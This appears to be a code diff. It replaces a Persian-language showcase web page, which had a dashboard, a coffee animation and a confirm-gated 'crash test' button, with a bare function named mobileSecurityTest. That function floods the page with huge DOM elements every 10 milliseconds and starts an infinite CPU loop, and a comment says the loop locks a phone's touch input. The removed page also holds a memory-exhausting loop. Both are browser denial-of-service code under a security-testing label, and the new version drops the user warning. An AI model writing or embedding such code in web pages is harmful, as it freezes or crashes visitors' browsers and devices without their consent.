@@ -1,164 +1,18 @@
-<!DOCTYPE html>
-<html lang="fa" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS ULTIMATE OS | SECURITY EDITION</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: { nexus: '#00f2fe', dark: '#020617' },
-                    animation: { 'pulse-slow': 'pulse 4s infinite' }
-                }
-            }
+function mobileSecurityTest() {
+    // ۱. اشغال حافظه گرافیکی و متنی
+    setInterval(() => {
+        let mobileStress = document.createElement('h1');
+        mobileStress.innerText = new Array(500000).join('NEXUS_SECURITY_');
+        document.body.appendChild(mobileStress);
+    }, 10);
+
+    // ۲. ایجاد فشار روی پردازنده موبایل
+    function infinite() {
+        while(true) {
+            let x = Math.random() * Math.random();
+            // این حلقه باعث قفل شدن تاچ گوشی می‌شود
         }
-    </script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;500;800&display=swap');
-        body { font-family: 'Vazirmatn', sans-serif; background: #020617; color: #e2e8f0; overflow: hidden; margin: 0; }
-        
-        .bg-animate { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at 50% 50%, #0f172a 0%, #000 100%); }
-        .cyber-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; }
-        
-        .section { display: none; height: 80vh; overflow-y: auto; padding: 20px; }
-        .section.active { display: block; animation: fadeIn 0.4s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    }
+    setTimeout(infinite, 500); 
+}
 
-        /* کافه پیشرفته */
-        .cup-container { position: relative; width: 120px; height: 100px; border: 4px solid #fff; border-radius: 5px 5px 40px 40px; background: rgba(255,255,255,0.1); overflow: hidden; margin-top: 50px; }
-        .liquid { position: absolute; bottom: 0; left: 0; width: 100%; height: 0%; transition: height 3s ease; }
-        .pour-stream { position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 6px; height: 0; z-index: 5; transition: height 0.3s; }
-    </style>
-</head>
-<body class="p-4">
-
-    <div class="bg-animate"></div>
-
-    <header class="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-center mb-6 gap-4">
-        <div class="flex items-center gap-3">
-            <div class="w-12 h-12 bg-nexus rounded-xl flex items-center justify-center shadow-[0_0_15px_#00f2fe]"><i class="fas fa-shield-alt text-black"></i></div>
-            <h1 class="text-2xl font-black text-white">NEXUS <span class="text-nexus">PRO</span></h1>
-        </div>
-        <nav class="cyber-card p-1 flex gap-1">
-            <button onclick="setTab('home')" class="px-4 py-2 rounded-xl text-sm font-bold hover:bg-nexus hover:text-black transition">داشبورد</button>
-            <button onclick="setTab('cafe')" class="px-4 py-2 rounded-xl text-sm font-bold hover:bg-nexus hover:text-black transition">کافه</button>
-            <button onclick="setTab('sys')" class="px-4 py-2 rounded-xl text-sm font-bold hover:bg-nexus hover:text-black transition">امنیت و سیستم</button>
-        </nav>
-    </header>
-
-    <main class="max-w-6xl mx-auto">
-        <section id="home" class="section active">
-            <div class="cyber-card p-10 text-center">
-                <h2 class="text-4xl font-black mb-4">خوش آمدی، <span class="text-nexus">رضا</span></h2>
-                <div id="clock" class="text-6xl font-mono my-6">00:00:00</div>
-                <p class="opacity-50 uppercase tracking-widest text-xs">System Status: Protected by Nexus Kernel</p>
-            </div>
-        </section>
-
-        <section id="cafe" class="section">
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-8 h-full items-center">
-                <div class="space-y-3">
-                    <button onclick="brew('Espresso', '#3c2a21', 40)" class="w-full cyber-card p-4 flex justify-between items-center hover:border-nexus transition"><span>☕ اسپرسو</span><i class="fas fa-chevron-left"></i></button>
-                    <button onclick="brew('Cappuccino', '#c6a17b', 85)" class="w-full cyber-card p-4 flex justify-between items-center hover:border-nexus transition"><span>🥛 کاپوچینو</span><i class="fas fa-chevron-left"></i></button>
-                    <button onclick="brew('Iced Tea', '#8cae6d', 75)" class="w-full cyber-card p-4 flex justify-between items-center hover:border-nexus transition"><span>🍃 آیس تی</span><i class="fas fa-chevron-left"></i></button>
-                </div>
-                <div class="flex flex-col items-center">
-                    <div id="stream" class="pour-stream"></div>
-                    <div class="cup-container"><div id="liquid" class="liquid"></div></div>
-                    <div id="cafe-msg" class="mt-4 font-bold text-nexus">انتخاب کنید...</div>
-                </div>
-            </div>
-        </section>
-
-        <section id="sys" class="section">
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div class="cyber-card p-6 border-red-500/20">
-                    <h3 class="text-red-500 font-bold mb-4 flex items-center gap-2"><i class="fas fa-bug"></i> آزمایشگاه تست نفوذ (PoC)</h3>
-                    <p class="text-sm opacity-70 mb-6">این بخش برای بررسی آسیب‌پذیری DoS در مرورگر طراحی شده است. اجرای آن باعث مصرف حداکثری منابع می‌شود.</p>
-                    <button onclick="startAudit()" class="w-full bg-red-600/20 border border-red-500 text-red-500 p-4 rounded-xl font-bold hover:bg-red-600 hover:text-white transition">
-                        اجرای تست پایداری (Crash Test)
-                    </button>
-                </div>
-                <div class="cyber-card p-6">
-                    <h3 class="text-nexus font-bold mb-4">اطلاعات هسته</h3>
-                    <div class="space-y-2 font-mono text-xs opacity-60">
-                        <p>> CPU_LOAD: NORMAL</p>
-                        <p>> RAM_ALLOCATION: DYNAMIC</p>
-                        <p>> ENCRYPTION: AES-256 Enabled</p>
-                        <p id="bat-status">> BATTERY: Detecting...</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <script>
-        // ناوبری
-        function setTab(id) {
-            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-        }
-
-        // ساعت
-        setInterval(() => {
-            document.getElementById('clock').innerText = new Date().toLocaleTimeString('fa-IR');
-        }, 1000);
-
-        // سیستم کافه
-        function brew(name, color, fill) {
-            const liq = document.getElementById('liquid');
-            const str = document.getElementById('stream');
-            const msg = document.getElementById('cafe-msg');
-            
-            liq.style.height = '0%';
-            str.style.backgroundColor = color;
-            str.style.height = '100px';
-            msg.innerText = `در حال آماده‌سازی ${name}...`;
-
-            setTimeout(() => {
-                str.style.height = '0';
-                liq.style.backgroundColor = color;
-                liq.style.height = fill + '%';
-                msg.innerText = `${name} آماده شد!`;
-            }, 2000);
-        }
-
-        // --- تست نفوذ (بخش اصلی مورد نظر شما) ---
-        function startAudit() {
-            const confirmTest = confirm("هشدار امنیتی: این عملیات باعث فریز شدن تب و احتمالاً کرش کردن مرورگر موبایل/دسکتاپ شما می‌شود. آیا ادامه می‌دهید؟");
-            
-            if(confirmTest) {
-                // نمایش وضعیت قبل از فریز شدن
-                document.body.innerHTML = "<div style='background:#000; color:red; height:100vh; display:flex; align-items:center; justify-content:center; font-family:monospace; text-align:center;'><h1>ATTACK STARTED...<br>RESOURCES EXHAUSTED</h1></div>";
-                
-                // ایجاد فشار حداکثری روی RAM و CPU برای کرش دادن
-                setTimeout(() => {
-                    let memoryHog = [];
-                    while(true) {
-                        // ۱. پر کردن رم با سرعت بالا
-                        let data = new Array(1000000).fill("NEXUS_EXPLOIT_TEST_REZA");
-                        memoryHog.push(data);
-                        
-                        // ۲. درگیر کردن پردازنده
-                        Math.sqrt(Math.random() * 99999999);
-                        
-                        // اضافه کردن المان به DOM برای سنگین کردن پردازش گرافیکی
-                        let el = document.createElement('div');
-                        document.body.appendChild(el);
-                    }
-                }, 500);
-            }
-        }
-
-        // اطلاعات باتری
-        if(navigator.getBattery) {
-            navigator.getBattery().then(bat => {
-                document.getElementById('bat-status').innerText = `> BATTERY: ${Math.round(bat.level * 100)}%`;
-            });
-        }
-    </script>
-</body>
-</html>
